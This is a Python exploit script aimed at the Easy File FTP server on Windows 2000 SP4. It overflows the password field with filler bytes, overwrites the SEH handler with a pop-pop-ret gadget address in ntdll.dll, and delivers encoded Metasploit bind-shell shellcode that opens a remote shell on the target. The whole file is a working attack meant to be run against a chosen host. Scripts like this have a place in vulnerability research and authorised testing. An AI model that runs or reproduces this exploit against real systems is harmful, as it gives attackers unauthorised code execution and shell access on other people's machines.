#!/usr/bin/python

# Name:    rio atmadja
# Program: easy file ftp 
# Target : Windows 2000 SP4
# Vuln   : Password is vulnerable to BOF 

import os
import sys
import time
import struct
import socket

def ExploitFTP(target):


	sockAddr = (target, 21)
	tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	tsock.connect(sockAddr)
	response = tsock.recv(1024)
	print response

	nseh = "\xeb\x06\x90\x90"
	seh = "\xde\x2d\xf8\x77" # 0x77f82dde : pop esi # pop edi # ret (C:\WINNT\system32\ntdll.dll) 

	# msfpayload windows/shell_bind_tcp R | msfencode -b "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e" -t c
	shellcode = ("\x33\xc9\x83\xe9\xaa\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
	"\xa8\x9d\xeb\xf8\x83\xee\xfc\xe2\xf4\x54\x75\x62\xf8\xa8\x9d"
	"\x8b\x71\x4d\xac\x39\x9c\x23\xcf\xdb\x73\xfa\x91\x60\xaa\xbc"
	"\x16\x99\xd0\xa7\x2a\xa1\xde\x99\x62\xda\x38\x04\xa1\x8a\x84"
	"\xaa\xb1\xcb\x39\x67\x90\xea\x3f\x4a\x6d\xb9\xaf\x23\xcf\xfb"
	"\x73\xea\xa1\xea\x28\x23\xdd\x93\x7d\x68\xe9\xa1\xf9\x78\xcd"
	"\x60\xb0\xb0\x16\xb3\xd8\xa9\x4e\x08\xc4\xe1\x16\xdf\x73\xa9"
	"\x4b\xda\x07\x99\x5d\x47\x39\x67\x90\xea\x3f\x90\x7d\x9e\x0c"
	"\xab\xe0\x13\xc3\xd5\xb9\x9e\x1a\xf0\x16\xb3\xdc\xa9\x4e\x8d"
	"\x73\xa4\xd6\x60\xa0\xb4\x9c\x38\x73\xac\x16\xea\x28\x21\xd9"
	"\xcf\xdc\xf3\xc6\x8a\xa1\xf2\xcc\x14\x18\xf0\xc2\xb1\x73\xba"
	"\x76\x6d\xa5\xc0\xae\xd9\xf8\xa8\xf5\x9c\x8b\x9a\xc2\xbf\x90"
	"\xe4\xea\xcd\xff\x57\x48\x53\x68\xa9\x9d\xeb\xd1\x6c\xc9\xbb"
	"\x90\x81\x1d\x80\xf8\x57\x48\xbb\xa8\xf8\xcd\xab\xa8\xe8\xcd"
	"\x83\x12\xa7\x42\x0b\x07\x7d\x14\x2c\xc9\x73\xce\x83\xfa\xa8"
	"\x8c\xb7\x71\x4e\xf7\xfb\xae\xff\xf5\x29\x23\x9f\xfa\x14\x2d"
	"\xfb\xca\x83\x4f\x41\xa5\x14\x07\x7d\xce\xb8\xaf\xc0\xe9\x07"
	"\xc3\x49\x62\x3e\xaf\x21\x5a\x83\x8d\xc6\xd0\x8a\x07\x7d\xf5"
	"\x88\x95\xcc\x9d\x62\x1b\xff\xca\xbc\xc9\x5e\xf7\xf9\xa1\xfe"
	"\x7f\x16\x9e\x6f\xd9\xcf\xc4\xa9\x9c\x66\xbc\x8c\x8d\x2d\xf8"
	"\xec\xc9\xbb\xae\xfe\xcb\xad\xae\xe6\xcb\xbd\xab\xfe\xf5\x92"
	"\x34\x97\x1b\x14\x2d\x21\x7d\xa5\xae\xee\x62\xdb\x90\xa0\x1a"
	"\xf6\x98\x57\x48\x50\x08\x1d\x3f\xbd\x90\x0e\x08\x56\x65\x57"
	"\x48\xd7\xfe\xd4\x97\x6b\x03\x48\xe8\xee\x43\xef\x8e\x99\x97"
	"\xc2\x9d\xb8\x07\x7d\x9d\xeb\xf8")
	payload = '\x41' * 2559 + nseh + seh + shellcode  

	user = 'USER anonymous\r\n'
	tsock.send(user)
	response = tsock.recv(1024)

	passwd = 'PASS \x2c' + payload + '\r\n'
	tsock.send(passwd)
	response = tsock.recv(1024)


if __name__ == '__main__':
	try:
	       target = sys.argv[1]
	except IndexError:
	       print 'Usage: %s <target>' % sys.argv[0]
	       sys.exit(-1)

	ExploitFTP(target)

